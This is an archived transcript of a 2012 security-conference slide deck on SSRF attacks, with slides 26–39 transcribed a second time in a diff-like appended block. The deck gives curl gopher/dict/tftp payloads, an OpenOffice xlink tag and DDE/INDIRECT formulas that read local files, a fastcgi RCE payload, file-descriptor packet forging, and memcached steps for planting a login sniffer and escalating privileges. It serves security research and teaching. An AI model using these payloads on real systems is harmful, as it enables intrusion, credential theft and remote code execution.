--  1. SSRF attacks andsockets: smorgasbord of vulnerabilities Vladimir Vorontsov, Alexander Golovko ONsec: web applications security
--  [ 2. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-2-638.jpg?cb=1353422771) Authors bio• Vladimir Vorontsov - security researcher, bug hunter awarded by Google/Yandex/ Adobe• Alexander Golovko - security researcher, Debian maintainer• Working together in ONsec company on web applications security
--  [ 3. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-3-638.jpg?cb=1353422771) A few words about modern web securityInput validation Format processingExternal network access Internal network access
--  [ 4. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-4-638.jpg?cb=1353422771) Forge yourprotocol brands!• Make a request from a server• Attack internal network• Forge packets• Splitting/smuggling• Other protocols!• Universal ways such as gopher://• Exploit anything ;)
--  [ 5. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-5-638.jpg?cb=1353422771) SSRF - new type of vulnerabilities?• We mean that SSRF is a generalized class of attacks• Introduced and used for convenience• Several vulnerabilities together or only one can lead to SSRF attacks• To vulns classiﬁcation use CWE ;)
--  [ 6. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-6-638.jpg?cb=1353422771) Where can i ﬁnd SSRF?• Export from remote ﬁles (like as «Upload from URL», «Export RSS feed»)• POP3/IMAP/SMTP connections from webapps• File format processing (XML, docx, archives, etc)• Databases• Others ...
--  [ 7. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-7-638.jpg?cb=1353422771) Writing to socket inwebapp code - bad way• Host/port ﬁltering is strange on webapp level. Work for ﬁrewall and admins, right?• Protocol smuggling (CRLF and others)• What you mean when send in socket «GET / HTTP/1.1rnHost: domrnrn» ?• And what server mean when receive this?
--  [ 8. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-8-638.jpg?cb=1353422771) Using HTTP clients - bad way too • When you using HTTP clients such as cURL remember their features: • ! Unsafe redirect (http:// --> ﬁle://) • Various protocols support (gopher:// dict:// tftp:// rtsp:// ) • Maximum URL length is more than browsers value (100Mb URL is OK)
--  [ 9. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-9-638.jpg?cb=1353422771) Redirect tricks header("Location: ".$_GET[r]);• Bypass webapp ﬁlters i.e. preg_replace using redirect • any host -> localhost • valid port -> any port • valid schema -> any schema • SOP for browsers, not for HTTPClients
--  [ 10. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-10-638.jpg?cb=1353422771) Dict schema• http://tools.ietf.org/html/rfc2229• curl dict://localhost:8000/GET / HTTP/1.1• Receive on server: CLIENT libcurl 7.24.0 GET / HTTP/1.1 QUIT
--  [ 11. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-11-638.jpg?cb=1353422771) Gopher schema• http://www.ietf.org/rfc/rfc1436.txt• TCP packets with your content• Without r n t chars by RFC (and 00 for cURL). But all chars in LWP, Java, ASP.Net ;)• By Polyakov/Chastukhin [ERPscan] at BH_US_12 and CVE-2012-5085 (ﬁxed now)• curl gopher://localhost:8000/2MyData # nc -vv -l -p 8000 listening on [any] 8000 ... connect to [127.0.0.1] from localhost [127.0.0.1] 64096 MyData
--  [ 12. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-12-638.jpg?cb=1353422771) Gopher schema• PHP doesn’t support gopher protocol!• Do not worry! PHP supports all vulnerabilities!• --with-curlwrappers provide gopher protocol in ﬁle_get_contents and others such as XXE
--  [ 13. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-13-638.jpg?cb=1353422771) TFTP schema• http://www.ietf.org/rfc/rfc1350.txt• UDP packets with your content (w/o 00 in cUrl) and 0x00 0x01 ﬁrst bytes (really bad)• curl tftp://localhost:64/MyUdpPacketHere02:11:21.378724 IP6 localhost.55928 > localhost.64: UDP, length 54 0x0000: 6000 0000 003e 1140 0000 0000 0000 0000 `....>.@........ 0x0010: 0000 0000 0000 0001 0000 0000 0000 0000 ................ 0x0020: 0000 0000 0000 0001 da78 2bcb 003e 0051 .........x+..>.Q 0x0030: 0001 4d79 5564 7050 6163 6b65 7448 6572 ..MyUdpPacketHer 0x0040: 6500 6f63 7465 7400 7473 697a 6500 3000 e.octet.tsize.0. 0x0050: 626c 6b73 697a 6500 3531 3200 7469 6d65 blksize.512.time 0x0060: 6f75 7400 3600 out.6.
--  [ 14. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-14-638.jpg?cb=1353422771) TFTP schema• Currently working on splitting datagrams to bypass 0x00 0x01 header in second packet• Without stable results now unfort ;(
--  [ 15. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-15-638.jpg?cb=1353422771) Various format processing issues• XML - External Entities, Signatures, WS etc (see http://erpscan.com/wp-content/uploads/ 2012/11/SSRF.2.0.poc_.pdf and http:// www.slideshare.net/d0znpp/onsec-phdays-2012- xxe-incapsulated-report)• OpenOfﬁce products (Draw, Calc and others)• All soft which can open sockets (provide links to external ﬁles in ﬁle format) - all modern soft• others (see you at HITB 2013)
--  [ 16. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-16-638.jpg?cb=1353422771) OpenOfﬁce - pretty good stuff• Universal solution to convert ofﬁce documents• Common in Enterprise system and large portals• Many forks (Libre and others)• What happens while uploaded document is converted?• What about links to external ﬁles in the documents?
--  [ 17. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-17-638.jpg?cb=1353422771) OpenOfﬁce - pretty good stuff for SSRF• RTFM http://docs.oasis-open.org/ofﬁce/v1.2/• Find all tags with xlink:href attribute• Do not forget about macros and applets (but really rare activated)• Exploit it!• <draw:image xlink:href="http://ololo.onsec.ru/? i’mSSRFed" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
--  [ 18. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-18-638.jpg?cb=1353422771) OpenOfﬁce - pretty good stuff for SSRF• Formula for happiness• DDE is your friend• =DDE("sofﬁce","ﬁle://i-want-to-read-this-ﬁle...)• Use simple formula to full path disclosure =CELL("ﬁlename")• Address links • A1=ﬁle:///etc/hosts#$Sheet1.A1:B31 • B1=INDIRECT(A1)
--  [ 19. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-19-638.jpg?cb=1353422771) SSRF exploitation ways• Open new socket• Use already opened sockets/ﬁles (authorized)• Where can i ﬁnd opened sockets/ﬁles?
--  [ 20. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-20-638.jpg?cb=1353422771) File descriptors: basics• Where does ﬁles in SSRF theme?• Data streams basics: sockets and ﬁles, etc• File descriptor - pointer to data stream• Each process have their own FD• dup, fork, exec - O_CLOEXEC• New data stream - new FD• Privileges while creating FD, not while access
--  [ 21. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-21-638.jpg?cb=1353422771) File descriptors: API• FD have minimum number by default (easy brute)• Access to already opened FDs: • PHP 5.3.3 <= 5.3.14 provide special wrapper fd:// to use FD simplest (later only on CLI mode) • Java: java.io.FileDescriptor • Perl: open AA, ‘>&2’; print AA ‘DataToFD’; • Python: os.open + os.write • Ruby: fd=IO.new(99,’w’);fd.write(‘ToFD-№99’); • Shell I/O redirection: $echo 123 > &2 • Privileges for chuid programs
--  [ 22. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-22-638.jpg?cb=1353422771) File descriptors: ProcFS• Special pseudo ﬁles system• Common in Linux, available in FreeBSD (not by default)• While opening /proc/<PID>/fd/<N> new datastream will be create with the same parameters (!not the same as FD API access to FD directly!)• You need together two FS privileges to access /proc • privileges on /proc/<PID>/fd/<N> • privileges on target ﬁle (!but not directories)• Examples: • RHEL /var/log/httpd/ - 0700, but access.log - 0644 • Debian before ﬁrst rotate access.log - 0644, than 0640
--  [ 23. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-23-638.jpg?cb=1353422771) File descriptors: cases• Already opened FDs: • May be opened with privileges greater than current • In sockets case may be already authorized• Typical case: starting Apache: • open sockets to listen (80,443) by root • open error/access.logs by root • fork childs • chuid() to www-data for all forks• You may write to error/access.logs and sockets from child processes
--  [ 24. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-24-638.jpg?cb=1353422771) Stuff here: File descriptors: examples • Write a HTTP packet into opened FD to forge server output (to current client):fd6.write("HTTP 200 OKrnHost:localhostrn...");//also forge logs • Write a MySQL packet into opened FD to do SQL command:fd1.write("x22x00x00x00x03INSERTINTO aa VALUES(1,fwrite)");
--  [ 25. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-25-638.jpg?cb=1353422771) Database connections pool• Pool is array of sockets with authorized sessions • Start when application server started and never close while app server working • May be many pools with different privileges (but not different for SSRF)
--  [ 26. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-26-638.jpg?cb=1353422771) PHP fastcgi SSRF RCE• Set php_admin_value, php_admin_ ﬂag from Stuff here: frontend• Access to fastcgi over socket threw SSRF • run any ﬁle as PHP script• Set fastcgi headers in forged fastcgi packet and overwrite php_admin_value, php_value • allow_url_fopen + auto_prepend_ﬁle +data:// text/php,<?php phpinfo();?> = RCE • doesn’t work when php_admin_{value, ﬂag} set in php fpm conﬁg
--  [ 27. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-27-638.jpg?cb=1353422771) Want something really cool?
--  [ 28. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-28-638.jpg?cb=1353422771) Memcached SSRF: easyand very dangerously• Host-basic auth in general• TCP and UDP sockets by default• At the same host with webapp• Plain/text protocol (binary also available)• Does not close the socket after an improper request• Needed only n (0x0a) injection to do this
--  [ 29. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-29-638.jpg?cb=1353422771) Memcached SSRF: exploitation methodology• Collect all available keys• Sort keys by name, determine interesting• Find interesting data• Replace interesting data to arbitrary
--  [ 30. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-30-638.jpg?cb=1353422771) Memcached SSRF: inject sniffer• Find html/js/etc template of login page in memcached values• Insert your login/password JS/etc sniffer• Watch sniffer’s logs and get passwords ;)• Proﬁt
--  [ 31. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-31-638.jpg?cb=1353422771) Memcached SSRF:dynamic templates RCE• Find template with interpreter’s code• Modify code to arbitrary• Call page with target template• Proﬁt
--  [ 32. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-32-638.jpg?cb=1353422771) Memcached SSRF:escalate your privileges• Find session in memcached keys• Determine key which contain privileges ﬂag of your current session (such as ‘Priv’)• Modify your access level to «superadmin»• You can also create a new «special» session with TTL 100 years if you want• Proﬁt
--  [ 33. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-33-638.jpg?cb=1353422771) Format SSRF answer to read data (HTTP)• In many cases webapp logic provide reading only one output format (such as images or XML)• Use HTTP request smuggling to do this• One connection but many requests• If protocol support this, you get concatenated output• Try challenge http:// hackquest.zeronights.org/missions/ErsSma/
--  [ 34. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-34-638.jpg?cb=1353422771) Format SSRF answer to read data (HTTP)$f=fsockopen("localhost",80);fputs($f,"GET /$path HTTP/1.1rnHost:localhostrnrn"); HTTP/1.1 200 OK ...GET /1 HTTP/1.1 data 1Host: localhost HTTP/1.1 200 OKGET /2 HTTP/1.1 ...Host: localhost data 2GET /3 HTTP/1.1 HTTP/1.1 200 OKHost: localhost ... data3
--  [ 35. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-35-638.jpg?cb=1353422771) Format SSRF answer to read data (HTTP) GET /head HTTP/1.1 HTTP/1.1 200 OK Host: localhost ... <?xml version=‘1.0’?><root> GET /data HTTP/1.1 <![CDATA[ Host: localhost HTTP/1.1 200 OK GET /foot HTTP/1.1 ... Host: localhost i want to read this <secret>ololo</secret>while($s = fgets($f)) $resp.=$s;$resp=substr($resp,strpos($resp,"rnr HTTP/1.1 200 OKn")); $doc = new DOMDocument(); ...$doc->loadXML($resp);echo $doc->getElementsByTagName("root")- ]]></root>>item(0)->nodeValue;
--  [ 36. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-36-638.jpg?cb=1353422771) Format SSRF answer to read data (HTTP)• How to create header and footer as you want?• Range HTTP header is your friend• All web pages are your friends• Make a mosaic of pieces - server responses
--  [ 37. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-37-638.jpg?cb=1353422771) What about images?• Valid JPG with data which you want to read in EXIF• GIF header and your data at EOF• Inject data into image header which hold even after resize (http:// ax330d.blogspot.ru/2011/06/mosaic- of-attacks-from-image-upload.html)• PHP getimagesize() bypass (http:// lab.onsec.ru/2012/05/php-all- getimage-bypass.html)
--  [ 38. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-38-638.jpg?cb=1353422771) What about hosting centers?• TFTP server contain machine images• Machines get TFTP images until netboot• Attacker may get images from TFTP and get /etc/shadow and other staff
--  [ 39. ](https://web.archive.org/web/20161108114039/http://image.slidesharecdn.com/ssrf-onsec-zn12-121120080849-phpapp02/95/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities-39-638.jpg?cb=1353422771) What the next?• SSRF bible cheatsheet available now!• https://docs.google.com/document/d/ 1v1TkWZtrhzRLy0bYXBcdLUedXGb9njT NIJXa3u9akHM• Follow us: http://lab.onsec.ru [ENG] @d0znpp @ONsec_lab
+![Original slide 26](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-26.png)
+
+PHP fastcgi SSRF RCE 
+- Set php_admin_value, php_admin_ flag from  frontend 
+- Access to fastcgi over socket threw SSRF 
+- run any file as PHP script 
+- Set fastcgi headers in forged fastcgi packet and  overwrite php_admin_value, php_value 
+- allow_url_fopen + auto_prepend_file +`data://text/php,<?php phpinfo();?>` = RCE 
+- doesn’t work when php_admin_{value, flag} set  in php fpm config
+
+Stuff here:
+
+## Slide 27
+
+![Original slide 27](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-27.png)
+
+Want something really cool?
+
+## Slide 28
+
+![Original slide 28](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-28.png)
+
+Memcached SSRF: easy  and very dangerously 
+- Host-basic auth in general 
+- TCP and UDP sockets by default 
+- At the same host with webapp 
+- Plain/text protocol (binary also available) 
+- Does not close the socket after an  improper request 
+- Needed only `\n` (0x0a) injection to do this
+
+## Slide 29
+
+![Original slide 29](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-29.png)
+
+Memcached SSRF:  exploitation  methodology 
+- Collect all available keys 
+- Sort keys by name, determine interesting 
+- Find interesting data 
+- Replace interesting data to arbitrary
+
+## Slide 30
+
+![Original slide 30](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-30.png)
+
+Memcached SSRF: inject  sniffer 
+- Find html/js/etc template of login page in  memcached values 
+- Insert your login/password JS/etc sniffer 
+- Watch sniffer’s logs and get passwords ;) 
+- Profit
+
+## Slide 31
+
+![Original slide 31](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-31.png)
+
+Memcached SSRF:  dynamic templates RCE 
+- Find template with interpreter’s code  
+- Modify code to arbitrary 
+- Call page with target template 
+- Profit
+
+## Slide 32
+
+![Original slide 32](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-32.png)
+
+Memcached SSRF:  escalate your privileges 
+- Find session in memcached keys 
+- Determine key which contain privileges flag  of your current session (such as ‘Priv’) 
+- Modify your access level to «superadmin» 
+- You can also create a new «special» session  with TTL 100 years if you want 
+- Profit
+
+## Slide 33
+
+![Original slide 33](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-33.png)
+
+Format SSRF answer to  read data (HTTP) 
+- In many cases webapp logic provide reading  only one output format (such as images or  XML) 
+- Use HTTP request smuggling to do this 
+- One connection but many requests 
+- If protocol support this, you get  concatenated output 
+- Try challenge http://hackquest.zeronights.org/missions/ErsSma/
+
+## Slide 34
+
+![Original slide 34](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-34.png)
+
+Format SSRF answer to read data (HTTP)
+
+```
+$f=fsockopen("localhost",80);
+fputs($f,"GET /$path HTTP/1.1\r\nHost: localhost\r\n\r\n");
+```
+
+Request stream:
+
+```
+GET /1 HTTP/1.1
+Host: localhost
+
+GET /2 HTTP/1.1
+Host: localhost
+
+GET /3 HTTP/1.1
+Host: localhost
+```
+
+Response stream:
+
+```
+HTTP/1.1 200 OK
+...
+data 1
+
+HTTP/1.1 200 OK
+...
+data 2
+
+HTTP/1.1 200 OK
+...
+data3
+```
+
+```mermaid
+flowchart LR
+ C["fsockopen + fputs listing"] --> Q["GET /1, GET /2, GET /3 request stream"]
+ Q --> R["Concatenated HTTP/1.1 200 OK responses: data 1, data 2, data3"]
+```
+
+## Slide 35
+
+![Original slide 35](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-35.png)
+
+Format SSRF answer to read data (HTTP)
+
+Request stream:
+
+```
+GET /head HTTP/1.1
+Host: localhost
+
+GET /data HTTP/1.1
+Host: localhost
+
+GET /foot HTTP/1.1
+Host: localhost
+```
+
+Response stream:
+
+```
+HTTP/1.1 200 OK
+...
+<?xml version=‘1.0’?><root>
+<![CDATA[
+
+HTTP/1.1 200 OK
+...
+i want to read this
+<secret>ololo</secret>
+
+HTTP/1.1 200 OK
+...
+]]></root>
+```
+
+
+
+```
+while($s = fgets($f))
+        $resp.=$s;
+$resp=substr($resp,strpos($resp,"\r\n\r\n")); $doc = new DOMDocument();
+$doc->loadXML($resp);
+echo $doc->getElementsByTagName("root")->item(0)->nodeValue;
+```
+
+```mermaid
+flowchart LR
+ Q["GET /head, GET /data, GET /foot request stream"] --> R["Concatenated HTTP responses with XML root and CDATA wrapping"]
+ R --> P["fgets, substr, DOMDocument and nodeValue listing"]
+```
+
+## Slide 36
+
+![Original slide 36](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-36.png)
+
+Format SSRF answer to  read data (HTTP) 
+- How to create header and footer as you  want? 
+- Range HTTP header is your friend 
+- All web pages are your friends 
+- Make a mosaic of pieces - server responses
+
+## Slide 37
+
+![Original slide 37](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-37.png)
+
+What about images? 
+- Valid JPG with data which you want  to read in EXIF 
+- GIF header and your data at EOF 
+- Inject data into image header which  hold even after resize (http://ax330d.blogspot.ru/2011/06/mosaic-of-attacks-from-image-upload.html) 
+- PHP getimagesize() bypass (http://lab.onsec.ru/2012/05/php-all-getimage-bypass.html)
+
+## Slide 38
+
+![Original slide 38](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-38.png)
+
+What about hosting  centers? 
+- TFTP server contain machine images 
+- Machines get TFTP images until netboot 
+- Attacker may get images from TFTP and  get /etc/shadow and other staff
+
+## Slide 39
+
+![Original slide 39](../../figures/2012/slideshare-net-ssrf-attacks-sockets-smorgasbord-vulnerabilities/slide-39.png)
+
+What the next? 
+- SSRF bible cheatsheet available now! 
+- https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM
+- Follow us: http://lab.onsec.ru [ENG] @d0znpp @ONsec_lab
